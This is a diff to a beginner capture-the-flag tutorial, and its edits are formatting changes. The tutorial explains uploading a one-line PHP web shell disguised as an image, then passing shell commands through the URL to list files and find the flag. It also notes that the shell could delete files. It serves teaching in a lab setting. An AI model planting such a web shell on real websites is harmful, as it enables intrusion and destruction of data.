@@ -24,7 +24,8 @@ The contents of this file are the following
 `<? print_r(system($_GET['cmd'])); ?>`
 
 What this line of code does is it allows for us to inject (enter) bash commands into the url. These bash commands can do all types of malicious things such as go list all the files the website contains, delete files, ect. We could destroy the website if we wanted to!
-> But we won't do that cause we are not the L33k3ers!
+
+**But we won't do that cause we are not the L33k3ers!**
 
 Now that you know what know what this file does, upload that file just as you did with your dessert image
 
@@ -33,7 +34,7 @@ Once you do that, you will be directed to a page that says
 
 With a little image underneath
 
-Right click on this image and select, **"Open Image in new Tab"**
+**Right click** on this image and select, **"Open Image in new Tab"**
 
 Once at the new webpage, go to the url and at the very end put this statement...
 
@@ -41,7 +42,7 @@ Once at the new webpage, go to the url and at the very end put this statement...
 
 Hit enter, and now you see a list of all the files that the website contains! Crazy right! 
 
-The command that is executed is directly after the `=`, so like we learned in the bash tutorial, `ls` prints all the contents of a directory. Now, find the flag!
+The command that is executed is directly after the `=`, so like we learned in the bash tutorial, `ls` prints all the contents of a directory. Now, find the **flag!**
 
 
 
